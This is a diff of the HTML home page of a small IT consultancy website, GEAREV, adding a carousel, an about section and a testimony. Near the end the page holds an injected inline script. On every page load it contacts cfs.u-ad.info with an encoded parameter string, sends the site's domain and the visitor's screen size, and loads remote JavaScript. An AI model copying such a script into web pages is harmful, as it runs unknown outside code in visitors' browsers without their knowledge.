@@ -21,12 +21,11 @@
     <link href="http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
     <link href="http://fonts.googleapis.com/css?family=Josefin+Slab:100,300,400,600,700,100italic,300italic,400italic,600italic,700italic" rel="stylesheet" type="text/css">
 
-
 </head>
 
 <body>
     <!-- Navigation -->
-    <nav class="navbar navbar-inverse navbar-fixed-top topnav" role="navigation">
+    <nav class="navbar navbar-default" role="navigation">
         <div class="container">
             <!-- Brand and toggle get grouped for better mobile display -->
             <div class="navbar-header">
@@ -49,7 +48,7 @@
                         <a href="about.html">About</a>
                     </li>
 					<li>
-                        <a href="blog.html">Service</a>
+                        <a href="services.html">Service</a>
                     </li>
                     <li>
                         <a href="contact.html">Contact</a>
@@ -61,21 +60,90 @@
         <!-- /.container -->
     </nav>
 
-    <div class="container">
+	<div class="container">
 
         <div class="row">
             <div class="box">
-                
+                <div class="col-lg-12 text-center">
+                    <div id="carousel-example-generic" class="carousel slide">
+                        <!-- Indicators -->
+                        <ol class="carousel-indicators hidden-xs">
+                            <li data-target="#carousel-example-generic" data-slide-to="0" class="active"></li>
+                            <li data-target="#carousel-example-generic" data-slide-to="1"></li>
+                            <li data-target="#carousel-example-generic" data-slide-to="2"></li>
+                        </ol>
+
+                        <!-- Wrapper for slides -->
+                        <div class="carousel-inner">
+                            <div class="item active">
+                                <img class="img-responsive img-full" src="img/intro-pic.jpg" alt="">
+                            </div>
+                        <!--    <div class="item">
+                                <img class="img-responsive img-full" src="img/slide-2.jpg" alt="">
+                            </div>
+                            <div class="item">
+                                <img class="img-responsive img-full" src="img/slide-3.jpg" alt="">
+                            </div>
+                        </div> -->
+
+                        <!-- Controls -->
+                        <a class="left carousel-control" href="#carousel-example-generic" data-slide="prev">
+                            <span class="icon-prev"></span>
+                        </a>
+                        <a class="right carousel-control" href="#carousel-example-generic" data-slide="next">
+                            <span class="icon-next"></span>
+                        </a>
+                    </div>
+                    <h2 class="brand-before">
+                        <small>Welcome to</small>
+                    </h2>
+                    <h1 class="brand-name">GEAREV</h1>
+                    <hr class="tagline-divider">
+                    <h2>
+                        <small>
+                            <strong>IT Consultant</strong>
+                        </small>
+                    </h2>
+                </div>
             </div>
         </div>
 
-        
+        <div class="row">
+            <div class="box">
+                <div class="col-lg-12">
+                    <hr>
+                    <h2 class="intro-text text-center">
+                        <strong>Who We Are?</strong>
+                    </h2>
+                    <hr>
+                    <img class="img-responsive img-border img-left" src="img/brain-gears.jpg" alt="">
+                    <hr class="visible-xs">
+             
+					<p>We are consultant IT company. We make real your imagine, improve your business and automatic your process. Your Dream is Our Goal. </p>
+                    <p>We service you as team with transparent progress, easy to communicate and adapt  for best solution, home culture, optimal time, cost and resource. We create application with guarantee maintenance. Free video training for your end user.</p>
+                    
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <div class="box">
+                <div class="col-lg-12">
+                    <hr>
+                    <h2 class="intro-text text-center">Gearev Testimony
+                        <strong>"Mila"</strong>
+                    </h2>
+                    <hr>
+                    <p align="center">Gearev Nott limit my idea, Gearev guide me how real my idea</p>
+                </div>
+            </div>
+        </div>
 
     </div>
     <!-- /.container -->
 
-    <footer>
-        <div class="container">
+ 		<footer>
+        <div class="container navbar-bottom">
             <div class="row">
                 <div class="col-lg-12 text-center">
                     <p>Copyright &copy; GEAREV 2016</p>
@@ -83,17 +151,16 @@
             </div>
         </div>
     </footer>
+   
+    <!-- /.container -->
 
     <!-- jQuery -->
-    <script src="js/jquery.js"></script>
+    <script src="bower_components/jQuery/dist/jquery.js"></script>
 
     <!-- Bootstrap Core JavaScript -->
     <script src="bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
 
-    <!-- Script to Activate the Carousel -->
-
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlR5frNYdoUrZ2ydBUf%2bUaFtdasBuhwjN9y9WrHPHcjdfwmhzZvIAQaFgrXoVPwuXVfjbLVlrw16YHdQmiNbiI15ldncN0WyHbwcP4xnSRLedLDF6co8%2fAglQPxKqhrp8XRmUuidtxEdy4K7N0WXy4xOrvB0%2b1T8V8kuqOJNcRLTrm4w0uafYmVrZTApv6NSGmyu1r564r9WTqHdA1cz7Z%2bbA3HvQAB7rhy9Z6ynVJUNo5gcLe9g%2bW8QqLAA6Ayu6kI6WYTSCpi7EW5uZHOik3VRxAsHwMTLl2PM7yit5PzCDEaCWEX2IwTKLPzn1aIZsbb1EDXzlMdC%2fJGpAnUUZYzTcVJa84n9w9sJ8DeKoCRbPYdj0qD%2bHHzG2v89Nlaqfvhd9rLuq9kMgxYunDw8tV6MjgIv2rbymip3wMipjaNxAxfnHGb3BXYVUckwwDIRsuk00ijVzNRU7BcvrnywmM%2fadNn7%2fO8Cg6lRRnDrMij41t73rdTA1lhqu9oYugYHo5FkKp12hC34Txwp%2bKrEcEZnLtRfrBNHUFElHgrGILHzIUk%2bVgMFU65HKeK8jhldXjMaioPMI%2f6vGJDu%2bvTKSquXBBTmKVIm7QARbrDq1IGrRk%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
-
 </body>
-
 </html>
+
